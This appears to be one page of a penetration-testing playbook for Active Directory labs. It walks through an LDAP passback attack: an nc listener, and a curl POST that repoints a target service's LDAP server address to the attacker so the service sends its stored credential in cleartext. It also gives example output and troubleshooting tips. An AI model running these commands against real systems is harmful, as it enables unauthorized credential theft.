# AD - LDAP Passback

**Step 37A of 50 · AD**

*Capture cleartext credentials from a service that attempts an outbound LDAP authentication to an attacker-controlled listener.*

## Run this

Start a raw TCP listener on the LDAP port:

```bash
nc -lvnp $Port
```

Trigger the outbound connection by pointing the service's LDAP server address at Kali:

```bash
curl -s -X POST --data "ip=$LocalIP" http://$BoxIP/settings.php
```

Read the credential from the listener output. It arrives as a cleartext LDAP Simple Bind.

## Example output

```text
Connection received on $BoxIP <source-port>
LDAP Simple Bind for $Domain\$Username
<password-redacted>
```

## What did you get?

- [ ] A cleartext credential was captured → **Store it with `boxset`, validate it with SMB and WinRM, then go to Step 40 · [[AD - Credential Validation]]**
- [ ] No connection was received → **Check the form field name in the HTML source, confirm only the server address field is named and posted, and confirm `nc` is listening before submitting**

## Notes

Use `nc`, not Responder. Responder handles SMB and HTTP NTLM challenges. LDAP Simple Bind sends credentials as raw TCP data, so a plain listener is sufficient.

The browser may mask the password, but the service sends its stored value when it makes the outbound LDAP connection.

## Gotcha

> [!warning] 💡
> Only named HTML form fields are included in a POST submission. Inspect the source before submitting. If the server address field is not named, the attack can silently fail.

> [!warning] 💡
> Use single quotes in zsh when storing passwords containing `!`. Double quotes or bare strings can trigger history expansion and corrupt the value.

## External Resources

- [HackTricks, LDAP Attacks](https://book.hacktricks.wiki/en/pentesting/pentesting-ldap.html)
- [PayloadsAllTheThings, LDAP Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection)
